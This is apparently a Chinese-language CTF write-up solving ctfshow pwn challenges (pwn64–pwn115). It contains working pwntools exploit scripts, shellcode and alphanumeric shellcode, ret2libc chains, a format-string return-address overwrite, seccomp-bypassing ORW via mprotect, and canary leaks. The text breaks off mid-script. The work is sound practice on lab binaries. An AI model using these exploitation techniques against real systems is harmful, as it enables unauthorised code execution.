# payload = b'\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80'
# p.sendline(payload)
# p.interactive()              换用成这个payload也行，反正都是shellcode
```

```c
ctfshow@ubuntu:~/Desktop/xd$ python pwn64.py
[+] Opening connection to pwn.challenge.ctf.show on port 28170: Done
[*] Switching to interactive mode
Some different!
$ ls
bin
boot
ctfshow_flag
dev
etc
home
lib
lib32
lib64
media
mnt
opt
proc
pwn
root
run
sbin
srv
start.sh
sys
tmp
usr
var
[*] Got EOF while reading in interactive
$ cat ctfshow_flag
$  
```

但是莫名其妙的

明明通了，但是ls过后立马就EOF了

查佬博客，说是有计时器

纯手速呗（）

直接cat就好了

ctfshow{fc607680-4116-49b5-9072-342b0cd71dd0}

## pwn65

```powershell
[*] 'C:\\Users\\26597\\Desktop\\pwn附件\\pwn65'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        PIE enabled
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```

PIE存在，无canary

RELRO全开，有RWX

无法反汇编，看main函数汇编代码：

```assembly
.text:0000000000001155 main            proc near               ; DATA XREF: _start+1D↑o
.text:0000000000001155
.text:0000000000001155 buf             = byte ptr -410h        "这里等价于void *buf; // [esp+8h] [ebp-410h]"
.text:0000000000001155 var_8           = dword ptr -8
.text:0000000000001155 var_4           = dword ptr -4
.text:0000000000001155
.text:0000000000001155 ; __unwind {
.text:0000000000001155                 push    rbp
.text:0000000000001156                 mov     rbp, rsp
.text:0000000000001159                 sub     rsp, 410h
.text:0000000000001160                 mov     edx, 14h        ; n
.text:0000000000001165                 lea     rsi, aInputYouShellc ; "Input you Shellcode\n"
.text:000000000000116C                 mov     edi, 1          ; fd
.text:0000000000001171                 mov     eax, 0
.text:0000000000001176                 call    _write
.text:000000000000117B                 lea     rax, [rbp+buf]       "Load Effective Address"
.text:0000000000001182                 mov     edx, 400h       ; nbytes
.text:0000000000001187                 mov     rsi, rax        ; buf
.text:000000000000118A                 mov     edi, 0          ; fd    "这三行得到的效果等价于read(0,buf,0x400)"
.text:000000000000118F                 mov     eax, 0                   
.text:0000000000001194                 call    _read "eax存储读到的字符串长度（_read的返回值为读取到的字符串的长度）"
.text:0000000000001199                 mov     [rbp+var_8], eax    "[rbp+var_8]赋值为eax，即读取到的字符数"
.text:000000000000119C                 cmp     [rbp+var_8], 0        "compare，cmp，比较[rbp+var_8]和0"
.text:00000000000011A0                 jg      short loc_11AC        "jg,jump if greater,大于则跳转，大于跳转到loc_11AC"
.text:00000000000011A2                 mov     eax, 0                 "如果不大于继续下面操作"
.text:00000000000011A7                 jmp     locret_1254            "跳转到locret_1254"
.text:00000000000011AC ; ---------------------------------------------------------------------------
```

这里有两个跳转路径，一个通向loc_11AC

另外一个通向locret_1254

先看底下那条路径，也就是1254

```assembly
.text:0000000000001254 locret_1254:                            ; CODE XREF: main+52↑j
.text:0000000000001254                                         ; main+DF↑j
.text:0000000000001254                 leave
.text:0000000000001255                 retn
```

这里直接进行了leave后retn了

然后程序就此中断，所以只能走上面的路径

从loc_11AC跳转后，还会继续进行跳转

```assembly
.text:00000000000011AC loc_11AC:                               ; CODE XREF: main+4B↑j
.text:00000000000011AC                 mov     [rbp+var_4], 0
.text:00000000000011B3                 jmp     loc_123A
```

loc_123A:

```assembly
.text:000000000000123A loc_123A:                               ; CODE XREF: main+5E↑j
.text:000000000000123A                 mov     eax, [rbp+var_4]
.text:000000000000123D                 cmp     eax, [rbp+var_8]
.text:0000000000001240                 jl      loc_11B8               "jump if less"
.text:0000000000001246                 lea     rax, [rbp+buf]
.text:000000000000124D                 call    rax
.text:000000000000124F                 mov     eax, 0
```

cmp比较eax和[rbp+var_8]
eax被复制为：[rbp+var_4]

这里得倒回去看loc_11AC，[rbp+var_4]被赋值为了0

所以这里的比较实则是0和[rbp+var_8]的比较

如果0比[rbp+var_8]小，则会跳转到loc_11B8

如果等于或相等则会继续操作

但是也知道[rbp+var_8]的内容就是我们输入的内容的长度

输入长度不可能小于或等于0的，因为我们需要传入shellcode

所以必然产生跳转，跳转进loc_11B8

```assembly
.text:00000000000011B8 loc_11B8:                               ; CODE XREF: main+EB↓j
.text:00000000000011B8                 mov     eax, [rbp+var_4]
.text:00000000000011BB                 cdqe                           "Convert Doubleword to Quadword"
.text:00000000000011BD                 movzx   eax, [rbp+rax+buf]     "Move with Zero-Extend"  
.text:00000000000011C5                 cmp     al, 60h ; '`'
.text:00000000000011C7                 jle     short loc_11DA         "jump if less or equal"
.text:00000000000011C9                 mov     eax, [rbp+var_4]
.text:00000000000011CC                 cdqe              
.text:00000000000011CE                 movzx   eax, [rbp+rax+buf]
.text:00000000000011D6                 cmp     al, 7Ah ; 'z'
.text:00000000000011D8                 jle     short loc_1236
```

***Convert Doubleword to Quadword***：“将双字（32位）扩展为四字（64位）”

`cdqe` 指令将 32 位寄存器 `eax` 的值符号扩展到 64 位寄存器 `rax` 中。也就是说，它会根据 `eax` 的符号位（最高位）来填充 `rax` 的高 32 位。

- 如果 `eax` 是正数或零，`rax` 的高 32 位会被填充为 0。
- 如果 `eax` 是负数，`rax` 的高 32 位会被填充为 1（即保持负数的符号）。

***Move with Zero-Extend***：`movzx` 是一条数据移动指令，它的全称是 **“Move with Zero-Extend”**，意思是“移动并零扩展”。

`movzx` 指令将一个较小的数据类型（如 8 位、16 位或 32 位）的值移动到一个较大的数据类型（如 32 位或 64 位）的寄存器中，并用零填充高位。这确保了目标寄存器中的值是非负的。

现在已知[rbp+var_4]是0，eax赋值为[rbp+var_4]，也是0了

cdqe指令过后，eax的值符号扩展到rax中，而eax的值为0，符号位上的值也就是0（表示非负）

也就是说rax的高32位会被0填充，低32位等于32位寄存器的eax的值

所以直接产生的效果是：rax的值仍然为0

然后再通过movzx指令赋值rbp+rax+buf的内容到eax中

`_read` 从标准输入读取了一些数据到 `buf`，那么 `[rbp+buf]` 中存储的是第一个字节的内容

rax又为0，所以直接的效果就是rbp+rax+buf = rbp + buf =标准输入进去并存储的第一个字节的内容

现在cmp就在对字节进行比较，al就是rax寄存器的低8位

而rax的低8位也就是其最末尾的低8位

al的值小于或等于0x60就会跳转loc_11DA

大于则继续执行

又一次eax赋值为[rbp+var_4]，相当于确保eax的值仍然为0

类似的两步操作过后再进行比较，如果字符内容的16进制表达式小于或等于0x7A，就会跳转到loc_1236

```assembly
.text:0000000000001236 loc_1236:                               ; CODE XREF: main+83↑j
.text:0000000000001236                                         ; main+A5↑j ...
.text:0000000000001236                 add     [rbp+var_4], 1
```

而loc_1236会将[rbp+var_4]加一

处理完后，会继续下一步指令

```assembly
.text:000000000000123A
.text:000000000000123A loc_123A:                               ; CODE XREF: main+5E↑j
.text:000000000000123A                 mov     eax, [rbp+var_4]
.text:000000000000123D                 cmp     eax, [rbp+var_8]
.text:0000000000001240                 jl      loc_11B8
.text:0000000000001246                 lea     rax, [rbp+buf]
.text:000000000000124D                 call    rax
.text:000000000000124F                 mov     eax, 0
```

这里步入loc_123A后，把eax赋值为[rbp+var_4]

此时的[rbp+var_4]就从0变为了1，然后和[rbp+var_8]进行大小比较

[rbp+var_8]是读取到的字符串长度

所以会小于，跳转loc_11B8

就此循环往复

直到[rbp+var_4] = [rbp+var_8]，也就是比较进行到最后一个字符串字符时，并完成整个流程后，才能步入lea rax,[rbp + buf]

最后进行call rax

所以对shellcode的限制就是输入的shellcode字符内容必须全部在0x60~0x7A

（当然还有另外两个判断路径，不再赘述，一个拿到的目标范围是0x2F~0X5A,一个是0X40~0X5A，合并起来就是0x2F~0X5A）

这个就是要求输入的shellcode为可见字符，利用alpha3生成

首先利用pwntools生成一个shellcode

```python
from pwn import *
context.arch='amd64'
sc = asm(shellcraft.sh())
with open('sc', 'bw') as f:
	f.write(sc)
```

将上述代码保存成sc.py放到alpha3目录下，然后执行如下命令生成待编码的shellcode文件

```powershell
cd alpha3
python3 sc.py > sc
```

使用alpha3生成string.printable （这里得用 python2）

```powershell
python2 ./ALPHA3.py x64 ascii mixedcase rax --input="sc"
```

因为 call rax ，所以 base 是 rax，得到

```c
Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H
```

最终exp：

```python
from pwn import *
io = remote("pwn.challenge.ctf.show",28261)
payload = b"Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t"
io.send(payload)
io.interactive()
```

（不能用sendline，因为换行符是0x10，不在字符串可接受范围内）

## pwn66

```powershell
[*] 'C:\\Users\\26597\\Desktop\\pwn附件\\pwn66'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

main函数看着是很普通的传入shellcode就能通的情况

但是存在一个检查机制

进入check函数

__

```c
int64 __fastcall check(_BYTE *a1)
{
  _BYTE *i; // [rsp+18h] [rbp-10h]

  while ( *a1 )
  {
    for ( i = &unk_400F20; *i && *i != *a1; ++i )
      ;
    if ( !*i )
      return 0LL;
    ++a1;
  }
  return 1LL;
}
```

这段代码是一个函数 `check`，它的作用是检查输入的字符串 `a1` 中的每个字符是否都存在于一个特定的字符数组 `unk_400F20` 中。如果所有字符都存在，则返回 `1`，否则返回 `0`。以下是详细的逻辑解释：

### 1. 函数参数和局部变量
- **参数**：
  - `_BYTE *a1`：指向输入字符串的指针。
- **局部变量**：
  - `_BYTE *i`：用于遍历 `unk_400F20` 数组的指针。

### 2. 外层循环：遍历输入字符串 `a1`
```c
while ( *a1 )
```
- 这个循环会逐个检查输入字符串 `a1` 中的每个字符，直到遇到字符串的结束标志（即 `*a1 == 0`，表示字符串结束）。
- `a1` 指针会逐个字符向后移动（`++a1`）。

### 3. 内层循环：检查当前字符是否在 `unk_400F20` 中
```c
for ( i = &unk_400F20; *i && *i != *a1; ++i )
```
- `i` 指针初始化为指向 `unk_400F20` 的起始位置。
- 这个循环会逐个检查 `unk_400F20` 中的字符，直到：
  - 找到与当前 `a1` 指向的字符相同的字符（`*i == *a1`）。
  - 或者到达 `unk_400F20` 的末尾（`*i == 0`，表示数组结束）。

### 4. 判断逻辑
- 如果在 `unk_400F20` 中找到了与当前 `a1` 指向的字符相同的字符（`*i == *a1`），则继续检查下一个字符（`++a1`）。
- 如果在 `unk_400F20` 中没有找到与当前 `a1` 指向的字符相同的字符（`*i == 0`），则直接返回 `0LL`，表示输入字符串中有字符不在 `unk_400F20` 中。

### 5. 返回值
- 如果输入字符串 `a1` 中的所有字符都在 `unk_400F20` 中，则循环会正常结束，函数返回 `1LL`。
- 如果输入字符串中有任何一个字符不在 `unk_400F20` 中，则函数会提前返回 `0LL`。

### 总结
这个函数的作用是检查输入字符串 `a1` 中的每个字符是否都存在于一个预定义的字符数组 `unk_400F20` 中。如果所有字符都存在，则返回 `1`，否则返回 `0`。

所以跟进unk_400F20

unk_400F20里面存在一定的字符

这种情况下有两种传入shellcode的方法

1.while(*a),也就是我们一般写代码的思路，遇到\x00就不校验了，所以如果shellcode以\x00开头就可以直接绕过

通过\x00绕过检查， 同时执行我们输入的shellcode就好，\x00B后面加上一个字符，  对应一个汇编语句。所以我们可以通过\x00B\x22、\x00B\x00 、\x00J\x00等等来绕过那个检查。

2.可见字符shellcode

这里给出的exp是绕过的方法

```python
from pwn import *
context(arch = 'amd64',os = 'linux',log_level = 'debug')
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28128)
shellcode = '\x00\xc0'  + asm(shellcraft.sh())
io.sendline(shellcode)
io.interactive()
```

## pwn101（整数转换、整数比较）

没啥东西，main函数要求输入对应值，直接交互就好了

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned int v4; // [rsp+0h] [rbp-10h] BYREF
  int v5; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v6; // [rsp+8h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  init(argc, argv, envp);
  logo();
  puts("Maybe these help you:");
  useful();
  v4 = 0x80000000;
  v5 = 0x7FFFFFFF;
  printf("Enter two integers: ");
  if ( (unsigned int)__isoc99_scanf("%d %d", &v4, &v5) == 2 )
  {
    if ( v4 == 0x80000000 && v5 == 0x7FFFFFFF )
      gift();
    else
      printf("upover = %d, downover = %d\n", v4, v5);
    return 0;
  }
  else
  {
    puts("Error: Invalid input. Please enter two integers.");
    return 1;
  }
}
```

v4是个无符号数，v5是有符号数

在x86-64系统上，整数类型（int和unsigned int）的大小都是4字节，并且它们的存储方式都是二进制补码。

因此，当我们使用%d读取时，它会将输入的字符串解释为一个有符号整数，并将该整数的位模式直接存储到v4的内存中（因为v4的地址被传递给了scanf，而scanf不知道v4是无符号的，它只是按照%d的规则写入一个32位有符号整数）

所以需要注意的点就是`%d`这种可以完成有符号和无符号数的隐蔽转换

该题目中，用有符号还是无符号效果一样，0x80000000 = -2147483648/2147483648都能用

16进制转值为10进制，nc交互进入gift函数

gift里面有cat /flag

直接拿到

## pwn102（整数转换、整数比较）

更没东西，main函数要V4值为-1.交互输入进去的就是V4，写个-1进去就拿到flag

后日谈：
实际上还是有点说法的，通过`%u`也造成了有符号和无符号数的隐蔽转换

这里虽然输入-1也行

但是-1是一个有符号数

通过%u才变成的无符号数

如图，当用%d的时候，会正常被认为是-1

但是一旦换成%u，-1会被解析为4294967295

所以，输入-1才能满足if判断

当然如果直接输入4294967295，那么经过%u它不会改变

也能直接过if判断

![image-20250529042307986](../../AppData/Roaming/Typora/typora-user-images/image-20250529042307986.png)

## pwn103（整数比较、符号错误（有符号读取，无符号使用））

关键内容都在ctfshow函数中

### ctfshow函数代码逻辑分析
1. **输入长度**：
   ```c
   printf("Enter the length of data (up to 80): ");
   __isoc99_scanf("%d", &v1);
   ```
   这里要求用户输入数据的长度，并存储在变量`v1`中。如果输入的`v1`大于80，程序会直接退出：
   ```c
   if ( v1 <= 80 )
   {
       ...
   }
   else
   {
       puts("Invalid input! No cookie for you!");
   }
   ```
   因此，输入的长度必须小于或等于80，才能继续执行。

2. **输入数据**：
   ```c
   printf("Enter the data: ");
   __isoc99_scanf(" %[^\n]", dest);
   ```
   这里要求用户输入数据，并存储在`dest`数组中。`dest`数组的大小是88字节，因此理论上可以存储最多87个字符（加上一个字符串结束符`\0`）。

3. **内存拷贝**：
   ```c
   memcpy(dest, src, v1);
   ```
   这里将`src`的内容拷贝到`dest`中，拷贝的长度是`v1`。然而，`src`被初始化为`0LL`，即空指针。如果`v1`大于0，`memcpy`会尝试从空指针拷贝数据，这会导致未定义行为（如程序崩溃）。但如果`v1`为0，`memcpy`不会执行任何操作，因为拷贝长度为0。

4. **条件判断**：
   ```c
   if ( (unsigned __int64)dest > 0x1BF52 )
       gift();
   ```
   这里判断`dest`的地址是否大于`0x1BF52`。由于`dest`是一个局部变量，其地址通常在栈上，且地址值通常远大于`0x1BF52`，因此这个条件很容易满足。

### 输入两次0的逻辑
1. **第一次输入0**：
   - 输入长度`v1`为0。
   - 程序会要求输入数据，但因为`v1`为0，`memcpy`不会执行任何操作。
   - `dest`数组的内容不会被修改，仍然是未初始化的。
2. **第二次输入0**：
   - 再次输入，控制的是`dest`
   - `v1`仍然为0，`memcpy`仍然不会执行任何操作。
3. **条件判断**：
   - 由于`dest`的地址（在栈上），通常远大于`0x1BF52`，条件`((unsigned __int64)dest > 0x1BF52)`成立。
   - 因此，无论第二次输入什么数，程序都会调用`gift()`函数。

### 漏洞总结
这个漏洞的根本原因是：
- `src`被初始化为`0LL`，但没有检查`src`是否为有效指针。
- `v1`为0时，`memcpy`不会执行任何操作，但程序没有对这种情况进行特殊处理。
- 条件`((unsigned __int64)dest > 0x1BF52)`过于宽松，容易被满足。

因此，通过连续输入两次0，可以绕过`memcpy`的潜在崩溃，并满足条件调用`gift()`函数。

所以进入gift函数即可拿到flag

## pwn104（整数溢出、整数转换）

没啥好说的，很标准的整数溢出然后依靠已写的that函数进行提权

第一次传入，传递的值是读取buf的长度，写长点就行了，无所谓的

你问我整数转换在哪？size_t nbytes被程序用%d读取，size_t 是个无符号整数类型，所以转换有了（）

```python
from pwn import *
p = remote("pwn.challenge.ctf.show",28302)
payload = b'a'*(0xe+8) + p64(0x000000000040078D)
p.sendline(b'21321')
p.sendline(payload)
p.interactive()
```

## pwn105（整数截断）

存在提权函数，拿到地址

dest溢出一下，0x11+4

v3是int 8

实际上就是二进制取八位的值

也就是说，能取的最大值是 1111 1111 = 255

所以要想绕过if条件判断

就需要255+1（这个1是因为还需要算上0这个值，共256个值）+ 4  ~~~264

ljust方法填充一下垃圾数据就行了

```c
char *__cdecl ctfshow(char *s)
{
  char dest[8]; // [esp+7h] [ebp-11h] BYREF
  unsigned __int8 v3; // [esp+Fh] [ebp-9h]

  v3 = strlen(s);
  if ( v3 <= 3u || v3 > 8u )
  {
    puts("Authentication failed!");
    exit(-1);
  }
  printf("Authentication successful, Hello %s", s);
  return strcpy(dest, s);
}
```

exp:

```python
from pwn import *
p = remote("pwn.challenge.ctf.show",28175)
shell = 0x0804870E
payload = b'a'*(0x11+4) + p32(shell)
payload = payload.ljust(260,b'a')
p.sendline(payload)
p.interactive()
```

## pwn106（整数截断）

和105巨像

根据实际交互效果搞上ru正确交互就好了

```python
from pwn import *
# context.log_level = 'debug'
p = remote("pwn.challenge.ctf.show",28231)
shell = 0x08048919
payload = b'a'*(0x14+4) + p32(shell)
payload = payload.ljust(260,b'a')
# cat_flag = shell
# payload = cyclic(0x14 + 4) + p32(cat_flag) + b'a' * 234
p.recvuntil(b'choice:')
p.sendline(b'1')
p.recvuntil(b'username:')
p.sendline(b' ')
p.recv()
p.sendline(payload)

p.interactive()
```

（还有些许问题，为什么被注释掉的payload也能用，为什么后补齐的垃圾数据长度是234，不就应该是256+3~~~256+7吗，奇奇怪怪的）

## pwn107（ret2libc、整数溢出、整数转换）

主函数没什么好说的

跟进

```c
int show()
{
  char nptr[32]; // [esp+1Ch] [ebp-2Ch] BYREF
  int v2; // [esp+3Ch] [ebp-Ch]

  printf("How many bytes do you want me to read? ");
  getch(nptr, 4);
  v2 = atoi(nptr);
  if ( v2 > 32 )
    return printf("No! That size (%d) is too large!\n", v2);
  printf("Ok, sounds good. Give me %u bytes of data!\n", v2);
  getch(nptr, v2);
  return printf("You said: %s\n", nptr);
}
```

两个getch，两次输入

```C
int __cdecl getch(int a1, unsigned int a2)
{
  unsigned int v2; // eax
  int result; // eax
  char v4; // [esp+Bh] [ebp-Dh]
  unsigned int i; // [esp+Ch] [ebp-Ch]

  for ( i = 0; ; ++i )
  {
    v4 = getchar();
    if ( !v4 || v4 == 10 || i >= a2 )
      break;
    v2 = i;
    *(_BYTE *)(v2 + a1) = v4;
  }
  result = a1 + i;
  *(_BYTE *)(a1 + i) = 0;
  return result;
}
```

跟进getch函数发现这个实际上就是个类gets函数

a2就是拿来限定读取长度的

其他的没什么好说的

回到show函数

第一次，getch(nptr,4)

也就是nptr作为输入字符，读取长度为4

想要不退出show函数，需要过条件判断，条件判断的是v2不能大于32

回到getch，输入的字符被保存为v4

然后v4会被atio函数强制转换为整数

然后v4参与if条件判断

那现在考虑怎么过这个判断

第一是要比32小，show函数才能继续

第二是要在第二次输入，也就是getch(nptr,v4)的时候造成一个存在栈溢出的漏洞点出来

实际上考虑一下传入-1，就可以发现它这个值很有用

1、第一次传入后，char nptr = “-1”

2、v2 = atoi(nptr)   这里atoi将字符转变为整数，而-1就能以整数的形式辅助过if条件判断

3、第二次getch函数，v2作为的是getch的第二个参数，v2在show函数中的数据类型是有符号整数，但是进入getch后，身为第二个参数的它被定义为无符号整数，而-1被解释为无符号整数的话，参考pwn102的图片，会被解释为一个极大的整数

那么就导致了，getch(nptr,v2)   <=====>getch(nptr,4294967295)

前面也说了，getch函数基本上可以看作是一个稍安全的gets函数，但是这里哪怕限定了读取长度，仍然通过整数转换导致了漏洞产生，形成栈溢出

然后就是很基础的ret2libc的构造了

没看到puts，那printf顶上就好了

泄露一个printf@libc 不太够用，多泄漏一个__libc_start_main就好了

然后找到对应的libc文件

然后就是很常规很常规的东西了

需要填充的垃圾数据长度为nptr这个缓冲区的长度，也就是0x2c + 4

exp:

```python
from pwn import *
context.log_level = 'debug'
#io = process('./pwn107')
io = remote('pwn.challenge.ctf.show',28281)
elf = ELF('./pwn107')
libc = ELF('./libc6-i386_2.27-3ubuntu1_amd64.so')
main = elf.symbols['main']
printf_plt = elf.plt['printf']
printf_got = elf.got['__libc_start_main']
#printf_got = elf.got['printf']
io.recvuntil('read?')
io.sendline('-1')
io.recvuntil('\n')
payload = cyclic(0x2c+4) + p32(printf_plt) + p32(main) + p32(printf_got)
io.sendline(payload)
io.recvuntil('\n')
printf = u32(io.recv(4))
print(hex(printf))
libc_base = printf - libc.sym['__libc_start_main']
system = libc_base + libc.sym['system']
bin_sh = libc_base + next(libc.search("/bin/sh"))
io.recvuntil('read?')
io.sendline('-1')
io.recvuntil('\n')
payload = cyclic(0x2c+4) + p32(system) + p32(main) + p32(bin_sh)
io.sendline(payload)
io.interactive()
```

（密码的，远程本地环境不一致，拿远程的libc版本为准，我就说怎么可能泄露的libc不对）

## pwn108

没看懂，日后再说

## pwn109

没玩明白，为什么ret = stack + 0x41C？

不该是0x40C吗？

其他的倒是好懂

选择选项1，这会调用`sub_8A4`函数（在exp中对应`io.sendlineafter('Quit!!!\n','1')`）。

这个函数会打印出buf的地址（通过`printf("%x\n", buf)`），然后读取用户输入到buf中。

因此，`io.recvuntil('\n')`接收到的是buf的地址（十六进制字符串），然后转换为整数，赋值给`stack`。

所以，`stack`变量就是buf的起始地址。

payload = fmtstr_payload(16, {ret:stack})

这是利用pwntools的fmtstr_payload函数来生成一个格式化字符串，用于将`ret`地址处的值修改为`stack`（即buf的地址

生成payload后，将其通过选项1（Input something）写入buf。

然后选择选项2（Hang out）触发格式化字符串漏洞（调用fmt(buf)），从而将返回地址修改为buf地址。

再次选择选项1（Input something），这次我们写入shellcode（`asm(shellcraft.sh())`）。这次写入的shellcode会覆盖之前写入的payload，但是因为我们已经将返回地址修改为buf的起始地址，而这次写入的shellcode也是从buf起始地址开始写入，所以当main函数返回时，就会执行这段shellcode。

最后选择选项3（Quit）退出main函数，触发返回，执行shellcode

```python
from pwn import *
context.log_level = 'debug'
#io = process('./pwn109')
io = remote('pwn.challenge.ctf.show',28238)
io.sendlineafter('Quit!!!\n', '1')
stack = int(io.recvuntil('\n'), 16)
ret = stack + 0x41c
payload = fmtstr_payload(16, {ret: stack})
io.sendline(payload)
io.sendlineafter('Quit!!!\n', '2')
io.sendlineafter('Quit!!!\n', '1')
io.sendline(asm(shellcraft.sh()))
io.sendlineafter('Quit!!!\n', '3')
io.interactive()
```



## pwn111

```shell
Arch:       amd64-64-little
RELRO:      No RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```

没啥东西就普通ret2text

```python
from pwn import *
io = remote("pwn.challenge.ctf.show",28250)
payload = b'a' *(0x80 +8)
payload += p64(0x0000000000400697)
io.sendline(payload)
io.interactive()
```

## pwn112

```shell
Arch:       i386-32-little
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
Stripped:   No
```

进ctfshow函数，是数组，初始化了var[13]，var[14]

但是，输入处存在可能使用的数组越界漏洞

```c
int ctfshow()
{
  var[13] = 0;
  var[14] = 0;
  init();
  puts("What's your name?");
  scanf("%s", var);
  if ( *(_QWORD *)&var[13] )
  {
    if ( *(_QWORD *)&var[13] != 0x11LL )
      return printf(
               "something wrong! val is %d",
               var[0],
               var[1],
               var[2],
               var[3],
               var[4],
               var[5],
               var[6],
               var[7],
               var[8],
               var[9],
               var[10],
               var[11],
               var[12],
               var[13],
               var[14]);
    else
      return register_tm();
  }
  else
  {
    printf("%s, Welcome!\n", var);
    return puts("Try doing something~");
  }
}
```

那就很简单了，直接把整个数组全填成0x11 也就是17就好了，连传14个进去，以满足var[13] = 0x11

（同理，你前面传13个其他莫名其妙的数字最后一个传17也能用）

```python
from pwn import *
context.log_level='debug'
#io = process('./pwn112')
io = remote('pwn.challenge.ctf.show',28220)
payload = p32(17) * 14
io.recv()
io.sendline(payload)
io.interactive()
```

## pwn113

```shell
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```

IDA打开看到有seccomp，看看沙箱限制

```shell
 line  CODE  JT   JF      K
=================================

 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x05 0xc000003e  if (A != ARCH_X86_64) goto 0007
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x02 0xffffffff  if (A != 0xffffffff) goto 0007
 0005: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0007
 0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0007: 0x06 0x00 0x00 0x00000000  return KILL
```

这里没啥好说的，就ban了execve，orw了多半

main函数感觉好难懂，先不急着分析

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // rax
  _BYTE v5[1032]; // [rsp+0h] [rbp-420h] BYREF
  __int64 v6; // [rsp+408h] [rbp-18h]
  char v7; // [rsp+417h] [rbp-9h]
  __int64 v8; // [rsp+418h] [rbp-8h]

  is_detail = 0;
  go();
  logo(argc, argv);
  fwrite(">> ", 1uLL, 3uLL, _bss_start);
  fflush(_bss_start);
  v8 = 0LL;
  while ( !feof(stdin) )
  {
    v7 = fgetc(stdin);
    if ( v7 == 10 )
      break;
    v3 = v8++;
    v6 = v3;
    v5[v3] = v7;
  }
  v5[v8] = 0;
  if ( (unsigned int)init(v5) )
  {
    qsort(files, size_of_path, 0x200uLL, (__compar_fn_t)cmp);
    search_file_info();
  }
  else
  {
    fflush(_bss_start);
    set_secommp();
  }
  return 0;
}
```

回想了一下保护就一个全开的RELRO，那就不可写got、plt嘛

看了看没有什么好利用的点

但是看到一个很奇怪的函数

```c
int __fastcall stat(char *filename, struct stat *stat_buf)
{
  return __xstat(1, filename, stat_buf);
}
```

（不知道啥东西，貌似是个结构体）

main函数中有⼀个判断，当我们输⼊的⽂件路径有问题，它就会返回0，然后进⼊沙箱中，那么我们就可以任意输⼊，使其出错进⼊沙箱进行沙箱ROP
先泄漏地址，再通过mprotect函数修改权限然后orw进⾏读flag，flag名称我们可以在远程连接的时候输⼊路径（输入`/`）即可看到flag⽂件格式

exp：

```python
from pwn import *

context(log_level='debug',arch='amd64', os='linux')

# io = process("./pwn113")
io = remote("pwn.challenge.ctf.show",28279)
elf = ELF("./pwn113")
libc = ELF("./libc6_2.27-0ubuntu3_amd64.so")
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
main = elf.sym['main']
pop_rdi = 0x0000000000401ba3
data = 0x603000
# pld = b'a'*(0x418) + p8(0x28)
# pld += p64(pop_rdi)
# pld += p64(puts_got)
# pld += p64(puts_plt)
# pld += p64(main)

pld = b"A"*0x418+p8(0x28)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)

io.recvuntil(b">> ")
io.sendline(pld)

puts_addr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
print(hex(puts_addr))

libc_base = puts_addr - libc.sym["puts"]
mprotect_addr = libc_base + libc.sym["mprotect"]

pop_rsi = libc_base + 0x0000000000023e6a
pop_rdx = libc_base + 0x0000000000001b96

gets_addr = libc_base+libc.sym["gets"]

io.recvuntil(b">> ")

payload = b"A"*0x418+p8(0x28)+p64(pop_rdi)+ p64(data)
payload += p64(gets_addr)+p64(pop_rdi)+p64(data)
payload += p64(pop_rsi)+p64(0x1000)+p64(pop_rdx)
payload += p64(7)+p64(mprotect_addr)+ p64(data)

io.sendline(payload)

sh = shellcraft.cat("/flag")
shellcode = asm(sh)
io.sendline(shellcode)

io.interactive()
```

仍然有些问题

为什么填充的垃圾数据组成是：b"A"*0x418+p8(0x28) + ·······

为什么是加p8(0x28)？

为什么不扔0x420个A进去？

## pwn114

IDA打开看main函数

逻辑是输入Yes就能getchar然后进ctfshow函数

ctfshow函数存在很明显的栈溢出漏洞

溢出长度是256

同时可以看到存在后门函数flagishere

具体原理可以参考大佬博客 [CTFShow bypass安全机制-CSDN博客](https://blog.csdn.net/KaliLinux_V/article/details/145963321)

基本上溢出就能拿到flag

cyclic 256填入直接纯nc交互就好

没必要exp

## pwn115

canary bypass第一题

main没东西

看ctfshow

ctfshow函数存在栈溢出漏洞

另外还找到了后门函数backdoor

如果没canary就是普通栈溢出打ret2text了

但是有canary

```shell
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

众所不周知，32位canary是4位，64是8位

东西挺常规的

泄露canary构造含canary的新payload

exp:

```python
from pwn import *
io = remote("pwn.challenge.ctf.show",28110)
payload = b'a' * (200)
io.sendline(payload)

# 泄漏canary
io.recvuntil(b'a'*200)
canary = u32(io.recv(4)) - 0xa    #这里的0xa减去的是换行符，10对着的就是\n嘛
print(hex(canary))

#利用canary，填入新payload
payload += p32(canary)
payload += b'a' * 12             #unsigned int v3; // [esp+CCh] [ebp-Ch] 这里说明了canary的值距离栈底都还差0xC = 12，所以为了触底，加段垃圾数据
